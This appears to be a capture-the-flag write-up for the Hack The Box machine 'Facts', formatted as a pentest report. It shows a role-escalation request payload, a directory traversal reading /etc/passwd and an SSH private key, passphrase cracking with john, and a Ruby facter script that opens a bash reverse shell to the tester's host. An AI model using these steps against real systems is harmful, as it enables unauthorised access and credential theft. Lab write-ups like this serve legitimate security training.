
## 📌 Engagement Info

* **Machine Name:** Facts
* **IP Address:** 10.129.37.218
* **Difficulty:** Easy
* **Operating System:** Linux
* **Date:** 4 Feb 2026

---

## 🧾 Executive Summary

This report documents the penetration testing process of the **Facts** machine from Hack The Box.

The objective was to identify vulnerabilities, exploit them, and achieve full system compromise (user + root).
The given attack box is vulnerable to broken authentication access vulnerability. Which gives and user from internet to register it self on application and then change his role to Admin due to unsanitized code in the password change step.

Next vulnerability is the Directory Traversal via download_private_file .It allows user with admin access to get files from server.Which leads to ssh private file disclosure.
As i have checked that the private key which is encrypted with password  also not safe as it uses very weak password which i found in rockyou.txt. Because of that user trivia get compromised.
On Linux server their is another path is available to get to root access which is not good sign of right security practice.Which i have discussed in later section in this report with how that get executed writeup.

---

## 🎯 Scope

| Target        | Description |
| ------------- | ----------- |
| 10.129.37.218 | HTB Machine |

---


## 🌐 Reconnaissance

### 🔎 Nmap Scan

```bash
sudo nmap -sC -sV -p- 10.129.37.218 --min-rate 2000 -oN facts_nmap
```

**Findings:**

* Open ports: 22,80,54321
---

### 🌍 Web Enumeration (if applicable)

```bash
ffuf -u http://facts.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

**Discovered:**

* Directories: login,admin,welcome,etc.

---

## 🔍 Enumeration

### 📂 Interesting Findings

- An account registration functionality was identified on /admin/login, allowing unauthenticated users to create accounts.

Creds :- 
Username: koham
Password : Pass@123

- After that we can use the password change functionality where we use the below payload to change our role to admin.

```
password%5Brole%5D=admin  
```

For doing this, Use the burp suite to intercept the password change request and add the payload at the end of query.

---

## 🚀 Initial Access

### 🧨 Vulnerability

* **Type:** **CVE-2026-1776**
* **Description:** . This vulnerability allows authenticated users to read arbitrary files from the underlying web server.

### ⚙️ Exploitation Steps

After getting admin access http://facts.htb/admin use this payload to get password file.

```bash
/media/download_private_file?../../../../../../../etc/passwd
```

The Nmap scan revealed an ED25519 SSH host key, indicating the likely presence of an `id_ed25519` private key on the system.

```
/home/trivia/.ssh/id_ed25519
```

This resulted in the disclosure of the SSH private key.

- The private key passphrase was cracked using John the Ripper:

```
ssh2john id_ed25519 > key

john --wordlist=/usr/share/seclists/rockyou.txt key

This revealed the passphrase, allowing SSH access as user trivia.
```
### ✅ Result

* Access gained as: `user`

---

## 🔺 Privilege Escalation

### 🔍 Enumeration

```bash
sudo -l 
```

The following sudo permissions were identified:

/usr/bin/facter run as sudo.


---

### 🧨 Exploit

* Technique used:
The binary Facter allows execution of custom Ruby code, which can be abused to execute arbitrary commands with elevated privileges.
* Steps:

```
mkdir /tmp/facts

nano root.rb  ### add next code in it.
```

```bash
Facter.add('flag') do
  setcode do
    require 'open3'
    stdout, stderr, status = Open3.capture3('/bin/bash -c "bash -i >& /dev/tcp/yoour-ip/4444 0>&1"' )
    stdout.strip
  end
end
```

```
### run the listner on port 4444 
### use rlwrap for more interactive session.

rlwrap nc -lnvp 4444
```
### 👑 Result

* Root access obtained

---


## 📸 Evidence


![[nmap1.png]]


![[nmap2.png]]



![[Fuzzing.png]]


![[cms.png]]

![[pre-foothold.png]]



![[admin.png]]

![[pre-foothold.png]]


![[foothold.png]]

![[root.png]]

![[path-to-root.png]]

![[root 1.png]]
![[root-taken.png]]



---

## 🛡️ Remediation Summary

🔴 Short Term
Patch the vulnerable application (CVE-2026-1776)
Implement input validation to prevent directory traversal
Enforce server-side authorization checks
Remove /usr/bin/facter from sudoers
🟡 Medium Term
Implement Role-Based Access Control (RBAC)
Harden session management
Restrict file system permissions
Enforce strong SSH key passphrases
🟢 Long Term
Adopt secure development practices
Implement centralized authentication mechanisms
Use SSH key lifecycle management
Enforce strong password policies using password managers

---

## 🧰 Tools Used

* Nmap
* FFUF
* Burp Suite
* John the Ripper
- ssh2john

---




